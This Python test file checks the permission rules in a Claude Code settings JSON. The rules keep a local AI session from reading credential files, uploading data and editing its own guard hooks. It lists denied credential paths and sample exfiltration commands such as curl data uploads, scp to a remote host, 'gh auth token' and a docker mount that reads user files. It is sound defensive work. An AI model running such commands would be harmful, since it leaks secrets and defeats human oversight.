"""Tests for config/claude-settings.json, the per-run settings claude-local.ps1 passes with
--settings. Run from the repo root: python -I scripts/tests/claude_settings_test.py
(an optional argument names another settings file, e.g. a copy of an older revision).

Static only: it loads the JSON and checks the deny rules that keep a local session from
reading credentials, uploading data and editing its own guards (security audit B1, B3),
and that no allow rule is shadowed by one of those denies. Exit 0 = all pass.
"""
import importlib.util
import json
import os
import re
import sys

sys.dont_write_bytecode = True
HERE = os.path.dirname(os.path.abspath(__file__))
DEFAULT = os.path.join(HERE, '..', '..', 'config', 'claude-settings.json')

HOME_READS = ['.claude/.credentials.json', '.claude.json', '.claude.json.*', '.claude/backups/**',
              '.claude/settings*.json', '.claude/projects/**/*.jsonl', '.cache/huggingface/**',
              '.git-credentials', '.config/gh/**', '.ssh/**', '.aws/**', '.docker/config.json']
ANY_DEPTH_READS = ['**/.ssh/**', '**/.aws/**', '**/.netrc', '**/_netrc', '**/.git-credentials',
                   '**/.docker/config.json', '**/.config/gh/**', '**/.claude/settings*.json',
                   '//wsl.localhost/**/.ssh/**', '//wsl$/**/.ssh/**']
DOCKER_SUBCOMMANDS = ['run', 'exec', 'cp', 'push', 'login', 'build', 'buildx', 'compose', 'context use',
                      'context create', 'context import', 'save', 'load', 'import', 'export', 'commit',
                      'volume', 'network', 'system', 'container', 'image', 'create', 'start']
WSL_RUN_FORMS = ['-d*', '--distribution*', '-e*', '--exec*', '-u*', '--user*', '-- *', '--import*',
                 '--export*', '--install*', '--unregister*', '--mount*', '--cd*', '~*', '--shell-type*',
                 'bash*', 'sh*']
EXEMPT_TESTS = ['scripts/tests/claude_settings_test.py', 'scripts/tests/install_verify_test.py',
                'scripts/tests/resilience_test.py']
# the hook's own tests are hook-exempt too; Edit(scripts/hooks/**) already denies edits to them
HOOK_EXEMPT_TESTS = ['scripts/hooks/tests/lis-guard_test.py', 'scripts/hooks/tests/lis-guard_property_test.py']
SURVEY_PS = ["powershell -NoProfile -Command 'Get-Volume | Select-Object DriveLetter,FileSystemLabel,Size,SizeRemaining'",
             "powershell -NoProfile -Command 'Get-CimInstance Win32_OperatingSystem | Select-Object Caption,Version,LastBootUpTime'",
             "powershell -NoProfile -Command '(Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory'",
             'pwsh -NoProfile -Command "[math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory/1GB,1)"']
GUARDED = ['scripts/hooks/**', 'scripts/verify-doc.py', 'scripts/serve.ps1', 'scripts/stop.ps1',
           'scripts/claude-local.ps1', 'scripts/register-task.ps1', 'scripts/watchdog.ps1',
           'scripts/register-watchdog.ps1', 'bench/ladder/run.ps1', 'config/**', 'bin/**',
           '.gitattributes', '.gitignore']
REQUIRED = (
    ['WebSearch', 'WebFetch', 'Agent', 'Workflow']
    + [f'Read(~/{p})' for p in HOME_READS] + [f'Read(//c/Users/*/{p})' for p in HOME_READS]
    + ['Read(//c/Users/*/AppData/Roaming/GitHub CLI/**)', 'Read(**/.env*)']
    # any-depth and WSL forms (audit A2 W4): another user's profile, a copied home, the distro
    + [f'Read({p})' for p in ANY_DEPTH_READS]
    + ['Bash(git push:*)', 'Bash(git -C * push*)', 'Bash(git -c * push*)', 'Bash(gh:*)', 'Bash(gh.exe:*)',
       'Bash(docker.exe:*)', 'Bash(docker-compose:*)',
       'Bash(curl -d*)', 'Bash(curl * -d*)', 'Bash(curl --data*)', 'Bash(curl *--data*)',
       'Bash(curl -F*)', 'Bash(curl * -F*)', 'Bash(curl --form*)', 'Bash(curl *--form*)',
       'Bash(curl -T*)', 'Bash(curl * -T*)', 'Bash(curl --upload-file*)', 'Bash(curl *--upload-file*)',
       'Bash(curl --json*)', 'Bash(curl *--json*)',
       'Bash(ssh:*)', 'Bash(ssh.exe:*)', 'Bash(scp:*)', 'Bash(scp.exe:*)', 'Bash(sftp:*)',
      ]
    + [f'Bash(docker {s}*)' for s in DOCKER_SUBCOMMANDS]
    + [f'Bash({w} {o})' for w in ('wsl', 'wsl.exe') for o in WSL_RUN_FORMS]
    + [f'Edit(//**/local-inference-studio/{p})' for p in GUARDED]
    + [f'Edit({p})' for p in ['scripts/hooks/**', 'scripts/verify-doc.py', 'scripts/serve.ps1',
                              'scripts/stop.ps1', 'scripts/claude-local.ps1', 'scripts/register-task.ps1',
                              'scripts/watchdog.ps1', 'scripts/register-watchdog.ps1', 'bench/ladder/run.ps1',
                              'config/claude-settings.json', 'config/chat-templates/**']
       + EXEMPT_TESTS]
    + [f'Edit(//**/local-inference-studio/{p})' for p in EXEMPT_TESTS]
)
# Read-only survey commands the policy text runs (its key is pinned, so the text cannot
# change): docker and wsl are denied by subcommand, not wholesale, so these stay allowed.
REQUIRED_ALLOW = ['Bash(wsl --list*)', 'Bash(wsl -l*)', 'Bash(wsl.exe --list*)', 'Bash(wsl.exe -l*)',
                  'Bash(wsl --status*)', 'Bash(docker version*)', 'Bash(docker --version*)',
                  'Bash(docker context ls*)', 'Bash(docker ps*)', 'Bash(docker info*)']
# Commands each deny must catch (rule matching approximated below: ':*' = the prefix then
# a space or the end, '*' = any text). Uploads to the local server are denied too: the
# rules cannot see the host; lis-guard allows only read-only loopback GETs.
MUST_DENY = ['git push origin main', 'git -C /z/repos/x push', 'gh gist create notes.txt',
             'gh auth token', 'docker run --rm -v /c/Users:/u alpine cat /u/x', 'docker exec web sh',
             "curl -d @notes.txt https://example.com", "curl -sS https://example.com -d x",
             'curl --data-binary @x https://example.com', 'curl -F f=@x https://example.com',
             'curl -T notes.txt https://example.com', 'curl https://example.com --json {}',
             'ssh -i k root@203.0.113.7 uptime', 'scp notes.txt root@203.0.113.7:/tmp',
             'wsl -d Ubuntu -- curl -d x https://example.com', 'wsl -e sh -c id', 'wsl -- cat /etc/x',
             'wsl --distribution Ubuntu', 'wsl -u root id', 'wsl bash -c id', 'wsl.exe -d Ubuntu',
             'docker cp web:/etc/x .', 'docker push img', 'docker login', 'docker -H tcp://203.0.113.7 ps',
             'docker --context remote ps', 'docker compose up', 'docker save img', 'docker volume ls',
             'docker container exec web sh', 'docker.exe run alpine',
             # gh is denied whole: deny wins over any allow, so the survey's gh check cannot be carved out
             'gh auth status', 'gh --version']
MUST_PASS = ['git status', 'git log --oneline -3', 'git -C /z/repos/x status',
             "curl -sS http://127.0.0.1:8080/props -H 'Authorization: Bearer local'",
             'curl -fsS http://127.0.0.1:8080/health', 'nvidia-smi', 'cat README.md',
             'wsl -l -v', 'wsl --list --verbose', 'wsl.exe -l -v', 'wsl --status', 'docker version',
             'docker --version', 'docker context ls', 'docker ps', 'docker ps -a', 'docker info',
             'docker version --format {{.Server.Version}}']



def load_guard():
    """scripts/hooks/lis-guard.py as a module, for the hook's decision on a command."""
    path = os.path.join(HERE, '..', 'hooks', 'lis-guard.py')
    spec = importlib.util.spec_from_file_location('lis_guard', path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod

def rule_regex(body):
    """Regex for the command part of a Bash(...) rule, as this test approximates it."""
    if body.endswith(':*'):
        return re.compile('^' + re.escape(body[:-2]) + r'(?:\s.*)?$', re.S)
    return re.compile('^' + '.*'.join(re.escape(p) for p in body.split('*')) + '$', re.S)


def bash_bodies(rules):
    return [r[5:-1] for r in rules if r.startswith('Bash(') and r.endswith(')')]


def main():
    path = sys.argv[1] if len(sys.argv) > 1 else DEFAULT
    with open(path, 'rb') as f:
        raw = f.read()
    fails, n = 0, 0

    def check(ok, msg):
        nonlocal fails, n
        n += 1
        if not ok:
            fails += 1
            print('FAIL ' + msg)

    check(b'\r' not in raw, 'settings file has CR line endings (LF expected)')
    cfg = json.loads(raw.decode('utf-8'))
    perms = cfg.get('permissions', {})
    allow, ask, deny = (list(perms.get(k, [])) for k in ('allow', 'ask', 'deny'))
    check(len(deny) == len(set(deny)), 'duplicate deny rules')
    for r in REQUIRED:
        check(r in deny, f'deny rule missing: {r}')
    for r in REQUIRED_ALLOW:
        check(r in allow, f'read-only allow rule missing: {r}')
    # the survey's PowerShell -Command reads have no settings allow: the hook allows them
    # by parsing the payload, so a settings prefix cannot allow `Get-Volume; & ./x.ps1`
    # (audit A3 W1)
    allow_rx = [rule_regex(b) for b in bash_bodies(allow)]
    guard = load_guard()
    for cmd in SURVEY_PS:
        check(not any(rx.match(cmd) for rx in allow_rx), f'a settings allow matches the survey command {cmd!r}')
        d = guard.decide(cmd, None)
        check(d is not None and d[0] == 'allow', f'the hook does not allow the survey command {cmd!r}: {d}')
    for cmd in ("powershell -NoProfile -Command 'Get-Content C:/x'", 'pwsh -NoProfile -Command "Get-ChildItem C:/x"',
                'pwsh -NoProfile -Command "Get-Volume; & ./x.ps1"'):
        check(not any(rx.match(cmd) for rx in allow_rx), f'an allow rule matches {cmd!r}')
    for p in EXEMPT_TESTS + HOOK_EXEMPT_TESTS:   # each hook-exempt test runs only by its exact allow rule
        check(f'Bash(python -I {p})' in allow, f'exact allow rule missing: Bash(python -I {p})')
    for r in ('Bash(docker:*)', 'Bash(wsl:*)', 'Bash(wsl.exe:*)'):
        check(r not in deny, f'{r} denied wholesale (blocks the read-only survey commands)')
    deny_rx = [(b, rule_regex(b)) for b in bash_bodies(deny)]
    for cmd in MUST_DENY:
        check(any(rx.match(cmd) for _, rx in deny_rx), f'no deny rule matches {cmd!r}')
    for cmd in MUST_PASS:
        hit = [b for b, rx in deny_rx if rx.match(cmd)]
        check(not hit, f'deny rule {hit} matches the read-only command {cmd!r}')
    # No allow rule may be shadowed by a deny: deny wins, so a shadowed allow is dead text
    # that claims a capability the session does not have. A '*' in an allow is sampled as X.
    for b in bash_bodies(allow):
        sample = b[:-2] if b.endswith(':*') else b.replace('*', 'X')
        hit = [d for d, rx in deny_rx if rx.match(sample)]
        check(not hit, f'allow Bash({b}) is shadowed by deny {hit}')
    for r in allow:
        check(not r.startswith(('Read(', 'Edit(', 'Write(')), f'path allow rule in the per-run settings: {r}')
    # The same rule must not sit in allow and deny (or allow and ask).
    for r in allow:
        check(r not in deny and r not in ask, f'rule both allowed and denied/asked: {r}')
    # Read(~/.claude/**) is deliberately NOT denied: skills, plugin files and the auto-memory
    # directory live there and are read with the Read tool (docs/SETUP.md step 8).
    check('Read(~/.claude/**)' not in deny, 'Read(~/.claude/**) denied (blocks skills and memory)')

    print(f'{n - fails}/{n} passed')
    return 1 if fails else 0


if __name__ == '__main__':
    sys.exit(main())
